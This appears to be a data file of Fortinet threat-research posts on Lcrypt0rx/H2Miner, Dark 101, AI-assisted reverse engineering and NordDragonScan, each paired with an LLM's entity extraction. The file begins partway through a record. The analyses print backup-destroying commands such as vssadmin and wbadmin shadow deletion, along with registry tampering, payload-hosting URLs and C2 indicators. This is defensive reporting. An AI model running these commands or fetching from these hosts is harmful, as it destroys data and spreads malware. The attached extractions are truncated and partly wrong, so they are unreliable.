forcibly terminates taskmgr.exe, msconfig.exe, and regedit.exe. It also modifies theScancode Mapregistry to disable a wide range of keys, including: Mouse buttons are reversed, and all changes are applied immediately to disrupt user control. From (Hex) From (Key) To (Hex) To (Key) Notes E05B Left Windows 0000 Disabled Disable Left Win E05C Right Windows 0000 Disabled Disable Right Win 001D Left Ctrl 0000 Disabled Disable Left Ctrl E01D Right Ctrl 0000 Disabled Disable Right Ctrl 002A Left Shift 0000 Disabled Disable Left Shift 0036 Right Shift 0000 Disabled Disable Right Shift 0038 Left Alt 0000 Disabled Disable Left Alt E038 Right Alt (AltGr) 0000 Disabled Disable Right Alt 003B F1 0000 Disabled Disable F1 E053 Delete (Ext) 0000 Disabled Disable Delete E000 Null? (invalid) 0000 Disabled Malformed entry? 003C F2 0000 Disabled Disable F2 003D F3 0000 Disabled Disable F3 002E C 0000 Disabled Disable C 0032 M 0000 Disabled Disable M 0020 D 0000 Disabled Disable D 0014 T 0000 Disabled Disable T 001E A 0000 Disabled Disable A 001F S 0000 Disabled Disable S 0025 K 0000 Disabled Disable K 0031 N 0000 Disabled Disable N 0022 G 0000 Disabled Disable G 0012 E 0000 Disabled Disable E 0013 R 0000 Disabled Disable R 0017 I 0000 Disabled Disable I 0044 F10 0000 Disabled Disable F10 Next, the script marks itself asread-only,hidden, andsystem-protected, and proceeds to overwrite theMaster Boot Record (MBR)—a destructive move that renders the system unbootable. Lcrypt0rx then attempts to disable Windows Defender real-time protection, BitDefender, and Kaspersky. However, the methods used for BitDefender and Kaspersky are ineffective—likely artifacts of LLM hallucinations. The firewall is disabled via netsh. An 8,192-character master key is then generated using ASCII values 1–255, and a per-file salt of equal length is appended to it during the encryption process. This key-salt pair is used to XOR-encode each file’s content. Folders selected for encryption include standard directories and OneDrive backups. System recovery is disrupted by: cmd.exe /c vssadmin delete shadows /all /quietcmd.exe /c wbadmin delete catalog -quiet Next, a ransom note is dropped in multiple locations (Desktop, Documents, Pictures, Videos, Downloads, Music) and opened in Notepad. The message demands$1,000(up from $500 in earlier samples) and shortens the payment deadline from 5 to 3 days. The .onion URL in the note is syntactically incorrect and doesn't match the one shown in the desktop wallpaper, which uses an obsolete V2 TOR address, suggesting a placeholder or reuse by H2Miner actors. An image from https://s10[.]krakenfiles[.]com/uploads/30-04-2025/605q6HLKTv/image[.]jpg is then downloaded and set as the desktop background by editing the HKCU\\Control Panel\\Desktop\\Wallpaper registry key. The TOR address in the image aligns with older Lcryx variants. Lcrypt0rx then establishes fallback persistence by dropping and registering multiple embedded scripts via run keys. This time, persistence works correctly, with the scripts executed using wscript.exe and marked as read-only, system-protected, and hidden. A summary of the scripts is listed below: Full path Description C:\\Windows\\SysWOW64\\msvcr80.dll.bat Ping’s ragebot[.]fun, a game cheat developer site. C:\\Windows\\System32\\systemconfig.exe.vbs Denial-of-Service script that floods the system's network interface’s gateway and ragebot[.]fun with 45 MB HTTP POSTs. C:\\Windows\\advapi32_ext.vbs Uses taskkill to kill targeted processes, including popular AV processes like Avast, Windows Defender, Kaspersky, AVG, Norton, Protegent360, AvGuard, McAfee McShield, etc., in an infinite loop. C:\\Windows\\System32\\USB_bridge.vbs Monitors for any newly connected drive and then copies itself over. Likely a prototype script. C:\\Windows\\CDConnector.vbs Monitors for any connected CD drive and attempts to eject it. C:\\Windows\\System32\\slmgr.bat.vbs Launches itself with the windows hidden and continuously displays a message box demanding ransom payments. It also resets the system time to 00:00, likely in an attempt to confuse system logs. The script then modifies the hosts file to block AV-related domains and disables cmd.exe for the current user by setting: HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\\DisableCMD Lcrypt0rx then downloads and executes miners and infostealers before finally entering the encryption routine.This section is not seen in older Lcryx samples. The details about the executables are listed below. URL MD5 Description http://89[.]208[.]104[.]175:5002/ime3[.]exe 9e4f149dae1891f1d22a2cea4f68432e A Trojan with fake Google resources that is primarily used for disabling defences and Monero mining. It modifies the hosts file to block popular AV sites, adds defender whitelisting via PowerShell, removes the MSRT update via wusa.exe, disables Windows updates via sc.exe, creates a service persistence for itself, and escalates privileges via BYOVD technique for the vulnerable driver WinRing0.sys http://89[.]208[.]104[.]175:5002/piperpate[.]exe a729410de4dc397d1fb2ab8f7ae560d3 Lumma stealer. C2s: disciplipna[.]top/eqwu, praetori[.]live/vepr, opusculy[.]top/keaj, scriptao[.]digital/vpep, civitasu[.]run/werrp\", , exitiumt[.]digital/xane, viriatoe[.]live/laopx, brandihx[.]run/lowp, triremeo[.]digital/akds https://bitbucket[.]org/sadsafsadfsadf/dsfgdsgssdfgdsg/downloads/MicrosoftSoftware[.]exe 2726145d4ef3b34d3c3a566177805c39 Injector that checks for debugger and then injects DCRat. http://47[.]97[.]113[.]36:10010/02[.]08[.]2022[.]exe 1aee8a425ea53c571a16b8efde05ba01 Cobalt Strike C2 : 47[.]97[.]113[.]36 http://176[.]65[.]137[.]203/music-play[.]exe B6cd214bb814362694cc48299ebaf0e5 A Trojan that drops .bat files that execute xmrig miners from temp. The IP range also hosts a Metasploit reverse shell for Windows and Linux with C2 callbacks to 176[.]65[.]138[.]172 & softwareshop[.]win. The range also hosts web shells. http://185[.]156[.]72[.]121/test/exe/random[.]exe 0680df49e1866c86697028ea73d28d28 Amadey Infostealer. C2s: 185[.]156[.]72[.]96/te4h2nus/index.php mutex: 006700e5a2ab05704bbb0c589b88924d\" encryption_key: NGEyYjFkNzk0ZTc5YTQ1MzJiNmUyYjY3OTQwOGQyYmI= http://80[.]64[.]18[.]161/files/6051142952/8QivM1I[.]exe d3884cc519c6855ae20d64264d5f6e93 RustyStealer. It also executes multiple PowerShell commands that add folder exclusion for users\\<username> and appdata\\local\\packages to defender, creates runonce and scheduled task persistence for itself. These scripts have minor syntactical errors. http://78[.]153[.]140[.]66/xmrig[.]exe 57f0fdec4d919db0bd4576dc84aec752 Same Xmrig miner that was downloaded by H2miner script 1.ps1  6868c280c61c0b1e2ab8bf6792f1eef2 https://207[.]231[.]109[.]252/bin/support[.]client[.]exe 44143827116c96f5dcace4f95dff8697 ConnectWise ScreenConnect. The config used for Monero mining points to the following wallets for mining payouts: Lcrypt0rx now enters a persistent loop that continuously scans the previously enumerated directories and any attached storage volumes for new files to encrypt. Each file is processed through an encryption routine with multiple checks and conditions. The routine begins by attempting to open the file using the OpenTextFile method in VBScript. This fails for executables, DLLs, and other system-critical formats, which are excluded by default through error handling. Before proceeding, the script verifies whether the file: Files that fail these checks are queued for encryption. To encrypt each file, Lcrypt0rx generates a unique8,192-character saltcomposed of ASCII characters (codes 1–255), which it appends to a pre-generated master key. This is a notable change from earlier Lcryx variants, where the salt length was only 32 characters. The script then XORs each character of the file content with the corresponding character from the combined key-salt pair, producing the obfuscated output. The resulting data is saved to a new file with the .lcryx extension, and the original file is deleted to complete the encryption process. As a final step, Lcrypt0rx checks all targeted folders for files associated with backups. Any files with recognized backup-related extensions are deleted to further prevent recovery. Despite these actions, the ransomware does not transmit or store the encryption keys locally or remotely. Combined with the use of simple XOR encryption, this makes recovery trivial through basic cryptanalysis. The lack of key management, combined with the presence of scare tactics and superficial ransom demands, suggests that Lcrypt0rx operates more asscarewarethan a serious ransomware threat. The H2Miner threat actors have remained active and adaptable since first emerging in late 2019. Their recent campaigns continue to rely on a blend of reused, proven tooling and newly integrated elements, including the curious addition of Lcrypt0rx ransomware. While Lcrypt0rx lacks the sophistication of more advanced ransomware families, it introduces distinct techniques for degrading system usability, UI interference, and redundant embedded scripts. It also bundles commercially available hack tools and infostealers, expanding its functionality beyond simple encryption. Ultimately, both the H2Miner and Lcrypt0rx chains converge on the deployment of Monero miners, a hallmark of resource hijacking campaigns. In cloud environments, this results in significant financial impact, as compromised systems incur elevated compute costs, degraded performance, and increased operational risk. The campaign reflects a broader trend: the commodification of cybercrime, where access to prebuilt tools, LLM-generated code, and cheap infrastructure lowers the barrier to entry, enabling even low-skill actors to launch high-impact campaigns. Fortinet customers are protected from the threats described in this report through multiple layers of defense provided by theFortinet Security FabricandFortiGuard security services. FortiGuard Antivirus detects and blocks the components of this campaign with the following signatures: These signatures cover malicious VBScript loaders, PowerShell-based XMRig miners, shell scripts used by Kinsing, Trojans, and stealers, as well as payloads that attempt to overwrite the MBR or beacon to Cobalt Strike infrastructure. FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus engine. Customers with up-to-date protections are already secured against these threats. Lacework FortiCNAPPhelps identify misconfigured cloud environments and runtime threats. It detects unauthorized mining activity, lateral movement, and the deployment of tools like XMRig or Kinsing in containerized or VM-based workloads. FortiCNAPP also correlates risk across posture, identity, and behavior to help prioritize critical vulnerabilities before they are exploited. TheFortiGuard Content Disarm and Reconstruction (CDR)service, available on FortiGate and FortiMail, can remove embedded threats from weaponized scripts and files—especially those delivered through phishing or lateral propagation. URLs used in this campaign, including malware delivery servers and C2 infrastructure, are rated as“Malicious Websites”by theFortiGuard Web Filtering service, preventing users from inadvertently accessing harmful payloads or ransom note URLs. FortiGuard IPSprovides network-level detection for indicators of malicious activity associated with both the H2Miner and Lcrypt0rx campaigns. Using deep-packet inspection and updated threat rules, it blocks: These protections cut off active infection vectors by identifying suspicious command-and-control behaviors and known malicious patterns. TheFortiGuard IP Reputation and Anti-Botnet Security Serviceblocks known malicious source IPs involved in mining operations, C2 activity, and dropper infrastructure. This service aggregates data from Fortinet’s global threat intelligence network, including FortiSandbox, honeypots, CERTs, and trusted partners. To help strengthen organizational resilience, Fortinet offers freesecurity awareness trainingthrough theNSE Training Institute: If you believe your organization has been impacted by Lcrypt0rx, H2Miner, or any related threats, please contactthe FortiGuard Incident Response Team To stay informed of new and emerging threats, sign up forFortiGuard Threat Intelligence alerts 78[.]153[.]140[.]6680[.]64[.]16[.]24189[.]208[.]104[.]17547[.]97[.]113[.]36176[.]65[.]137[.]203185[.]156[.]72[.]9680[.]64[.]18[.]161207[.]231[.]109[.]252104[.]21[.]32[.]1 Files ff1706b37fea16d75b739a5396d9ffba9e4f149dae1891f1d22a2cea4f68432ea729410de4dc397d1fb2ab8f7ae560d32726145d4ef3b34d3c3a566177805c391aee8a425ea53c571a16b8efde05ba01B6cd214bb814362694cc48299ebaf0e50680df49e1866c86697028ea73d28d28d3884cc519c6855ae20d64264d5f6e9357f0fdec4d919db0bd4576dc84aec75244143827116c96f5dcace4f95dff8697 1bf1efeadedf52c0ed50941b10a2f468a7bee104bb486ad0f10331233cc9a9f10dc2c71ce9c6c34668e9636abf61b1ae01e5b2530d4cba34f91c8090d19c92db Kinsing dbc9125192bd1994cbb764f577ba5ddab3039abf2ad5202f4a9363b418002351da753ebcfe793614129fc11890acedbcccef46c7edf9131ccffc47bd69eb743b 06a482a6096e8ff4499ae69a9c150e92f5f2b61b39105a2b1e6e1a5f4a3863ae9f764ec91535eaf03983b930d9f3bacd Wallet 4ASk4RhUyLL7sxE9cPyBiXb82ofekJg2SKiv4MKtCbzwHHLQxVVfVr4D4xhQHyyMTieSM5VUFGR9jZVR5gp6sa1Q2p8SahC89UoMhtsrpaJTvmJBbvy1cTdg38pomPFnW5Z4sniL2izcLQyGBkEGd96TcBJtzQUi6KAL5Ehe4cFpEMNdGF7tFKpJ1DqE8X89Arz88KTafhoTPAseYf2bfcWSjNq1YLaVY7ZkFaU21FivDueX4d7X7UErnyjAWHsVB1mibdTGHzqUTsS5FCMog89GVcQCh FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Okay, let's tackle this. First, I need to identify all the entities in the text according to the given types. Let's go through the input step by step.\n\nThe first part mentions \"H2miner Resurfaces with Lcrypt0rx Ransomware\". So \"H2miner\" is a threat type, maybe? Wait, the entity types include Threat Type. But H2Miner is a botnet, which is a type of threat. So (H2Miner, Threat Type). Then \"Lcrypt0rx Ransomware\" – Ransomware is a threat type, but the name here is Lcrypt0rx, which is a specific ransomware. So (Lcrypt0rx, Malware) since it's a type of ransomware. Wait, but the example 4 had H2Miner as a Threat Type. Let me check the entity types again. Threat Type is a category like Ransomware, APT, Botnet. So H2Miner is a botnet, which is a Threat Type. Lcrypt0rx is a specific ransomware, so it's a Malware. So that's two entities.\n\nNext, \"Affected Platforms: Linux, Windows, Containers\". These are platforms, but the entity types don't include Platform. So maybe not. The entity types are Malware, Threat Type, Attacker, Technique, Tool, Vulnerability, IP, Domain, URL, File, Hash. So",
      "entities": [],
      "relationships": [],
      "has_entities": false
    },
    "entity_count": 0,
    "relationship_count": 0,
    "model": "Qwen3 4B",
    "index": 3
  },
  {
    "title": "How FortiSandbox 5.0 Detects Dark 101 Ransomware Despite Evasion Techniques",
    "link": "https://www.fortinet.com/blog/threat-research/fortisandbox-detects-dark-101-ransomware-despite-evasion-techniques",
    "content": "FortiGuard Labs Threat Research Exposing the attack chain—from evasion to ransom note deployment The FortiGuard Labs team recently identified a ransomware that belongs to the Dark 101 malware family. The ransomware is delivered as an obfuscated .NET binary with the objectives of encrypting the victim’s personal files, deleting backup copies and the backup catalog, disabling recovery mode and Task Manager, and ultimately demanding a ransom payment in Bitcoin to decrypt the files. All behavioral data presented in this article was obtained from a Sandbox report, while additional reverse engineering was conducted to uncover further capabilities of the malware. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The FortiSandbox report documented the malware's behavior and provided visual aids to support the analysis. The following Tree View diagram (Figure 1) illustrates the execution sequence, outlining the chronological order of actions and processes initiated by the ransomware. The visual representation provides valuable insights into the malware’s operational flow, allowing users to track its behavior and comprehend its execution logic. Additionally, suspicious indicators triggered during the analysis were recorded (Figure 2), offering further context and aiding in the identification of suspicious and malicious activities. The ransomware first attempts to detect an analysis environment by checking whether the executable is running outside the %Appdata% folder. If so, it introduces a 10-second delay before continuing execution. However, FortiSandbox accurately simulates a realistic user environment by executing the sample from an expected location, allowing the ransomware to proceed without delay or altered behavior, thereby ensuring full visibility during analysis. An image of the sleepOutOfTempFolder function responsible for this environment check and delay is shown in Figure 3. Afterwards, the ransomware copies itself into the %Appdata% folder and renames itself to svchost.exe. This name mimics a legitimate Windows system process, which normally resides in C:\\Windows\\System32. By adopting this trusted name, the ransomware attempts to evade detection and reduce the chance of raising suspicion among users and automated tools. As shown in Figure 4, FortiSandbox correctly flags this process as high risk due to its suspicious behavior and inconsistent file location. As part of its anti-recovery strategy, the Dark 101 ransomware executes a series of destructive system commands designed to eliminate any possibility of restoring encrypted files through Windows’ built-in recovery features. Specifically, it runs the following commands, shown in Figures 5 and 6. The first two commands remove all Volume Shadow copies, which are typically used by the system to restore previous versions of the files. The third command deletes the Windows Backup catalog, effectively severing access to any system image backups that may have been created. By chaining these commands together, the ransomware ensures that both shadow copies and formal backup metadata are eradicated, leaving the victim with no local recovery option. Following the execution of vssadmin, wmic, and wbadmin commands to eliminate recovery options, the Dark 101 ransomware proceeds to disable Task Manager by modifying the Windows Registry. It sets the DisableTaskMgr value under the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System key to 1, which prevents users from launching the Task Manager. This tactic is commonly used to hinder user intervention, making it more difficult to terminate the ransomware process or inspect running activity. By restricting access to a critical system tool, the malware increases its persistence. Figure 7 shows the registry modification captured during execution. After disabling recovery mechanisms and system utilities, the ransomware begins scanning the file system directories for targets to encrypt. It targets user-accessible locations that are likely to contain personal or sensitive data, while avoiding critical system files and directories to prevent system instability. The ransomware maintains a predefined list of file extensions that are associated with documents, images, archives, databases, and other valuable content. Only files matching these extensions are selected for encryption, maximizing impact while minimizing the risk of a system failure. Once a file is identified and deemed valid for encryption, the ransomware encrypts its content and appends a randomly generated four-character extension to the filename. This not only renders the file unusable but also serves as a marker indicating successful encryption. Figure 8 displays a partial list of file extensions targeted during the encryption To inform the victim and demand payment, the Dark 101 ransomware drops a ransom note named read_it.txt into every directory containing encrypted files. This text file serves as an extortion message, notifying the victim that their data has been encrypted and providing detailed instructions on how to make a ransom payment. The note demands payment in Bitcoin and typically includes a unique identifier or contact information, such as an email address, to establish communication with the attacker. This tactic is designed to pressure the victim into complying with the ransom demands. Figure 10 shows the ransom note captured during analysis. With the ransom note deployed and encryption complete, the execution phase of the Dark 101 ransomware is complete. At this point, the malware has disabled recovery options, encrypted valuable files, and left payment instructions to coerce the victim into compliance. FortiSandbox successfully captured each stage of the attack—from evasion and execution to encryption and extortion, enabling comprehensive behavioral analysis and the extraction of threat intelligence. MITRE ATT&CK The table below lists the techniques used by the ransomware. This analysis of Dark 101 ransomware highlights the sophistication of modern malware and the need for proactive defense. FortiSandbox effectively detects and documents malicious behavior, showcasing its critical role in protecting against evolving cyber threats. The malware described in this report is detected and blocked byFortiGuard Antivirusas: MSIL/Kryptik.SAC!tr.ransom The FortiGuard AntiVirus engine is part of the FortiGate, FortiMail, FortiClient, and FortiEDR solutions. Customers who have these products with up-to-date protections are protected. FortiGuard Sandbox servicedetects the ransomware file as High Risk in the Ransomware category. We also suggest that our readers go through the freeNSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end-users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. ae3dd3d1eedb6835e6746d51d9ab21c6 HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableTaskMgr = 1 Vssadmin delete shadows /all /quietWmic shadowcopy deleteWbadmin delete catalog –quiet %APPDATA%\\svchost.exeRead_it.txt FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (Dark 101, Malware), (FortiGuard Labs, Organization), (FortiSandbox, Tool), (Bitcoin, Currency), (2025 Global Threat Landscape Report, Document), (Figure 1, Document), (Figure 2, Document)\nRelationships: (Dark 101, belongsTo, FortiGuard Labs), (Dark 101, uses, FortiSandbox), (Dark 101, uses, Bitcoin), (Dark 101, associatedWith, 2025 Global Threat Landscape Report), (Dark 101, associatedWith, Figure 1), (Dark 101, associatedWith, Figure 2)\nOkay, let's tackle this. The input is about a ransomware identified by FortiGuard Labs as part of the Dark 101 family. The main entities here are the ransomware itself, which is a Malware. The family name \"Dark 101\" is part of the Malware category. Then there's FortiGuard Labs, which is an organization, but the entity type here is Organization, which isn't one of the specified types. Wait, the user said to focus only on the listed entity types. So maybe FortiGuard Labs isn't an entity here unless it's a Threat Type, but that doesn't fit. The ransomware is a Malware, and the report is a Document,",
      "entities": [
        [
          "Dark 101",
          "Malware"
        ],
        [
          "FortiGuard Labs",
          "Organization"
        ],
        [
          "FortiSandbox",
          "Tool"
        ],
        [
          "Bitcoin",
          "Currency"
        ],
        [
          "2025 Global Threat Landscape Report",
          "Document"
        ],
        [
          "Figure 1",
          "Document"
        ],
        [
          "Figure 2",
          "Document"
        ]
      ],
      "relationships": [
        [
          "Dark 101",
          "belongsTo",
          "FortiGuard Labs"
        ],
        [
          "Dark 101",
          "uses",
          "FortiSandbox"
        ],
        [
          "Dark 101",
          "uses",
          "Bitcoin"
        ],
        [
          "Dark 101",
          "associatedWith",
          "2025 Global Threat Landscape Report"
        ],
        [
          "Dark 101",
          "associatedWith",
          "Figure 1"
        ],
        [
          "Dark 101",
          "associatedWith",
          "Figure 2"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 7,
    "relationship_count": 6,
    "model": "Qwen3 4B",
    "index": 4
  },
  {
    "title": "Catching Smarter Mice with Even Smarter Cats",
    "link": "https://www.fortinet.com/blog/threat-research/catching-smarter-mice-with-even-smarter-cats",
    "content": "FortiGuard Labs Threat Research How AI is Reshaping the Malware Arms Race From the beginning, the antivirus world has been acat-and-mousegame, where malware authors and antivirus engineers constantly adapt their code to bypass or catch each other. Artificial Intelligence is bringing the game to the next level, with malware authors using AI to improve their malware[1] and anti-virus engineers using AI to assist them with reverse engineering[2]. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Nowadays,nearly all malware is packed and/or obfuscated. AI doesn’t help (yet) for packers: we tried this on a Linux/Prometei botnet sample from February 2025, and the AI would have wasted time reversing the inner logics of the packer if we hadn’t helped it out. To be fair,unpacking is a difficult task that current disassemblers like IDA Pro or Ghidra can’t do either.It’s something an AV analyst has to perform beforehand and then supply the unpacked binary for further analysis. As for obfuscation, the news is far better. While AI would probably fail and require human assistance for complicated obfuscation, it works reasonably well over standard obfuscation and junk code. This is a significant advancement for the antivirus industry. In the example below, the AI successfully analyzed the obfuscation algorithm of Linux/Ladvix.E and implemented a working de-obfuscator.[3] Another technique which has been trending in the malware scene for a few years is the use of specific frameworks (e.g, Flutter [4]) or high-level languages (Go, Rust). Currently, AI struggles with Flutter and Rust malware, which is not surprising because the field is still new. Human researchers struggle to find solutions, too! We tried AI-assistance over the “Flutter assembly” of Android/SpyLoan: it was totally helpless, didn’t map function names or strings, etc. However, when we proceed in a smarter way and produce the Blutter[5]output for the malware, thenAI is able to reconstruct very readable Dart code. AI is quite successful with the older Delphi language. We assume the reason is that LLMs were trained with Delphi and Pascal material. Despite being old, Delphi is still strangely used to implement Linux/Filecoder.BR!tr (aka Trigona) ransomware (sample from April 2025). For example, Ghidra meticulously decompiles the main function of the ransomware. We can immediately identify Delphi function names (e.g SYSTEM_RANDOM), followed by their types (LONGINT, LONGINT), and inner memory management functions (FPC_ANSISTR_DECR_REF). The former are interesting because they correspond to code that the malware author explicitly called. The latter are not interesting for malware analysis as they are inserted by the compiler (Free Pascal Compiler, in this case) to handle Ansi strings. When asked to decompile the same function,the AI smartly removes those inner calls and produces source code that is way easier to readthan what Ghidra gave. The anti-virus world has always been a cat-and-mouse game. While AI is close to defeating standard string and code obfuscation, malware authors are likely to adapt by using more complex obfuscation. Similarly, malware authors can harden reverse engineering by using recent frameworks and languages. So, where’s the progress, might you argue? The main difference is that, for once, the antivirus industry has a new tool that helps it more than the adversary. We areforcingmalware authors to use more complex obfuscation and newer frameworks and languages. Rust is more secure than C? Sure! Butthey have to make the effort to learn how to use Rust, use new libraries, cope with bugs, etc. And while they do that, our LLMs can update and train on those novelties even faster. Yes,it’s the first time in 20 years where time and tools are in our favor. Fortinet customers are already protected from all malware mentioned in this article through our AntiVirus as follows: FortiGuard Labs detects the sample with the following AV signatures: Linux/Ladvix.E, Linux/Prometei.B, Adware/SpyLoan!Android, Linux/Filecoder.BR!tr TheFortiGuard AntiVirus serviceis supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. 943e1539d07eaffa4799661812c54bb67ea3f97c5609067688d70c87ab2f0ba4 – Linux/Ladvix.Ecc7ab872ed9c25d4346b4c58c5ef8ea48c2d7b256f20fe2f0912572208df5c1a – Linux/Prometei.Bc65298b6cd5a1769c747a0c7fb589ffa12fdf832b64787283953eaa57b65bc1c – Adware/SpyLoan!Androidc08a752138a6f0b332dfec981f20ec414ad367b7384389e0c59466b8e10655ec – Linux/Filecoder.BR!tr [1] https://www.hp.com/us-en/newsroom/press-releases/2024/ai-generate-malware.html [2]https://arxiv.org/html/2504.07574 [3]https://asciinema.org/a/724126Asciinema video of Linux/Ladvix deobfuscation [4]https://www.fortiguard.com/events/5552/virus-bulletin-2024-android-flutter-malware [5]https://github.com/worawit/blutter artificial intelligence FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "No related entities and relations\nOkay, let's tackle this. The user provided a text about AI's role in the malware arms race, discussing how malware authors and antivirus engineers are using AI. The task is to identify entities of specific types and their relationships.\n\nFirst, I'll scan through the text for any mentions of the entity types listed. The text mentions \"FortiGuard Labs Threat Research\" but that's an organization, not one of the entity types. Then there's \"AI\" which isn't an entity type here. The main entities mentioned are \"malware\" and \"antivirus engineers,\" but \"malware\" is a general term, not a specific instance. The text talks about \"Linux/Prometei botnet sample\" and \"Linux/Ladvix.E,\" which could be Malware or File entities. \n\nLooking at the entity types, Malware includes names like \"Backdoor.Atharvan,\" so \"Prometei botnet\" and \"Ladvix.E\" might be Malware. \"AI\" is mentioned in the context of being used by both malware authors and antivirus engineers, but AI isn't an entity type here. The text also mentions \"reverse engineering\" as a technique, which is under the Technique category. \n\nWait, the text says \"AI is bringing the game to the next level, with malware authors using AI to improve their malware.\" So \"malware\" is a general term, but the examples given in the text are",
      "entities": [],
      "relationships": [],
      "has_entities": false
    },
    "entity_count": 0,
    "relationship_count": 0,
    "model": "Qwen3 4B",
    "index": 5
  },
  {
    "title": "NordDragonScan: Quiet Data-Harvester on Windows",
    "link": "https://www.fortinet.com/blog/threat-research/norddragonscan-quiet-data-harvester-on-windows",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attacksSeverity Level:High FortiGuard Labs recently uncovered an active delivery site that hosts a weaponized HTA script and silently drops the infostealer “NordDragonScan”into victims’ environments. Once installed, NordDragonScan examines the host and copies documents, harvests entire Chrome and Firefox profiles, and takes screenshots. The package is then sent over TLS to its command-and-control server, “kpuszkiev.com,” which also serves as a heartbeat server to confirm the victim is still online and to request additional data when needed. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Attackers leverage shorter link services with “hxxps://cutt[.]ly/4rnmskDe” that redirects to “hxxps://secfileshare[.]com,” triggering the download of a RAR archive named “Укрспецзв_Акт_30_05_25_ДР25_2313_13 від 26_02_2025.rar” (Ukrspetszv_Act_30_05_25_DR25_2313_13 dated 26_02_2025). This file contains a malicious LNK shortcut that silently invokes mshta.exe to execute the hosted HTA payload “1.hta” from the same server. The malicious HTA file copies the legitimate PowerShell.exe binary to the path “C:\\Users\\Public\\Documents\\install.exe” to mask itself. It then downloads an encoded TXT file from a remote server, decodes it, and saves the result as “Act300525.doc.” This decoy document, titled “Акт здачі-приймання наданих Послуг до договору про надання послуг” (Act of Acceptance of Services under Service Agreement), is benign and intended to distract the user. Finally, the HTA script quietly drops and executes the actual malicious payload, embedded as a hardcoded executable named adblocker.exe, into the victim’s directory “\\AppData\\Local\\Temp\\adblocker.exe.” The attacker’s server maintains multiple decoy files designed to entice user interactions. These decoys employ a similar HTA script mechanism, which drops and executes the same payload, “adblocker.exe,” on compromised systems. The repeated use of the same executable across diverse decoys suggests a systematic approach by the threat actor to maximize infection opportunities while utilizing varied document themes and filenames to evade detection and security monitoring. The payload is a .NET executable containing an embedded PDB path: “C:\\Users\\NordDragon\\Documents\\visual studio.” NordDragonScan employs a custom string obfuscation routine, which performs an XOR operation and byte-swapping to conceal hard-coded strings from static analysis. It initially verifies if its dedicated working directory, “NordDragonScan,” exists in the “%LOCALAPPDATA%” folder. If this directory is absent, it creates it as a staging area to temporarily store stolen data before uploading it to the C2 server. It contacts the C2 server, ”kpuszkiev.com,” that contains specially crafted HTTP headers, specifically, “User-Agent: RTYUghjNM,” along with the victim machine’s MAC address. During its initial connection, the primary objective is to retrieve a dynamic URL from the C2, which it later leverages as an endpoint for exfiltrating stolen data. It then sets up persistence by adding a registry “NordStar” in “Software\\Microsoft\\Windows\\CurrentVersion\\Run.” After the connection, NordDragonScan pivots to local reconnaissance. It retrieves the victim’s basic information, including computer name, username, OS version, architecture, processor count, driver information, and RAM using a combination of WMI (Win32_OperatingSystem, Win32_ComputerSystem) and .NET environment calls. The stealer then enumerates every active network adapter, extracts the primary IPv4 address and subnet mask, and calculates the full CIDR range. It then initiates lightweight probes to each address in the same subnet, building an inventory of reachable hosts on the same local area network (LAN). It also captures a screenshot and saves it as “SPicture.png” and collects data from the targeted Chrome and Firefox browsers. NordDragonScan next scans the local file system, includingDesktop,Documents, andDownloadsfolders, and copies the files in these folders with the following extensions: “.docx,” “.doc,” “.xls,” “.ovpn,” “.rdp,” “.txt,” and “.pdf.”Once it obtains a matched file, it copies it into the working directory and groups it according to the source from which it was obtained. When the scanning stage is complete, it initiates a POST to the C2 server. That request carries the custom header “User-Agent: Upload,” a second header, “Backups:,” and the name of the data it is about to send, such as “sysinfo.txt” for system information. NordDragonScan utilizes an effective distribution network for dissemination. The RAR file contains LNK calls that invoke mshta.exe to execute a malicious HTA script, displaying a decoy document in Ukrainian. Finally, it quietly installs its payload in the background. NordDragonScan is capable of scanning the host, capturing a screenshot, extracting documents and PDFs, and sniffing Chrome and Firefox profiles. Users should treat LNK shortcuts and untrusted compressed archives with extreme caution. The malware described in this report is detected and blocked byFortiGuard Antivirusas: LNK/Agent.ALC!trVBS/Dropper.B!trMSIL/Agent.FFF!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. The FortiGuard CDR (Content Disarm and Reconstruction) service, which runs on both FortiGate and FortiMail, can disarm the malicious macros in the document. We also suggest that organizations go through Fortinet’s freeNSE trainingmodule:FCF Fortinet Certified Fundamentals. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. secfileshare[.]comkpuszkiev[.]com 2102c2178000f8c63d01fd9199400885d1449501337c4f9f51b7e444aa6fbf50e07b33b5560bbef2e4ae055a062fdf5b6a7e5b097283a77a0ec87edb7a3547253f3e367d673cac778f3f562d0792e4829a919766460ae948ab2594d922a0edae 